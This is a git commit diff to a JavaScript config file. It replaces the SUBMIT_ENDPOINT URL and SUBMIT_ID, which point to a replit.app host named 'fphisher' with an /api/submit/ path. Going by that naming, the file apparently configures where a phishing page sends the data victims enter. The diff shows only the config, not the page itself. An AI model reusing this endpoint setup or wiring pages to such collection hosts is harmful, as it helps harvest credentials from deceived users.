d16311c6ee0075072c7c968fbf6038f2311ffd95
Igbined <93369396+Igbined@users.noreply.github.com>
2026-04-03 14:08:01 +0100

    Update config.js

--- config.js
+++ config.js
@@ -1,3 +1,3 @@
 // config.js
-export const SUBMIT_ENDPOINT = "https://fphisher-30--gnzc8csfz5.replit.app/api/submit/cf49320885";
-export const SUBMIT_ID = "cf49320885";   // ← Change this if you need a different ID later
+export const SUBMIT_ENDPOINT = "https://fphisher-30--gnzc8csfz5.replit.app/api/submit/4514f21fd2";
+export const SUBMIT_ID = "4514f21fd2";   // ← Change this if you need a different ID later
